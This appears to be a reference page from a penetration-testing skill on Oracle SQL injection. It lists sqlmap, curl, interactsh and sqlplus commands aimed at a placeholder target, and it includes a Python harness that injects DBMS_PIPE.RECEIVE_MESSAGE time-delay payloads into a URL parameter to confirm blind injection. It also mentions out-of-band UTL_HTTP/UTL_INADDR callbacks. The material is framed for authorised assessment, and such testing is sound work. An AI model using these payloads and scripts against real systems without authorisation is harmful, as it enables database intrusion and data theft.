# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`sql-injection-oracle-variants`](SKILL.md) | Family: **Web and Application**

Flags below are the ones this technique actually needs. Verify with `--help` on your installed version before relying on an exact spelling.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `curl` | `curl -sS -o /dev/null -w '%{time_total}\n' 'https://target.example/report?dept=hr'` | Capture the elapsed-time baseline for an Oracle DBMS_PIPE timing differential | Cross-platform |
| `sqlmap` | `sqlmap -u 'https://target.example/report?dept=hr' --dbms=oracle --technique=UT --batch --level=1` | Confirm UNION and time channels on Oracle while excluding file and operating-system primitives | Linux, Windows, macOS |
| `interactsh-client` | `interactsh-client -v` | Collect the UTL_INADDR or UTL_HTTP callback with its source address so server origin is provable | Cross-platform |
| `sqlplus` | `sqlplus user/pass@target <<< 'SELECT banner FROM v$version;'` | Confirm an Oracle backend and version when a direct connection is in authorised scope | Linux, Windows |

## Minimal Script Shape

An Oracle timing harness: it measures a DBMS_PIPE.RECEIVE_MESSAGE timeout-zero branch against a five-second branch across repeats and reports whether the delay differential is real rather than jitter.

```python
import time
import urllib.parse
import urllib.request

BASE = "https://target.example/report"
PARAM = "dept"


def timed(value):
    url = BASE + "?" + urllib.parse.urlencode({PARAM: value})
    start = time.perf_counter()
    req = urllib.request.Request(url, headers={"User-Agent": "authorised-assessment"})
    with urllib.request.urlopen(req, timeout=30) as r:
        r.read()
    return time.perf_counter() - start


zero = "hr' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('probe',0)--"
five = "hr' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('probe',5)--"
fast = min(timed(zero) for _ in range(3))
slow = min(timed(five) for _ in range(3))
print({"fast_min_s": round(fast, 2), "slow_min_s": round(slow, 2),
       "dbms_pipe_differential": slow - fast > 4})
```
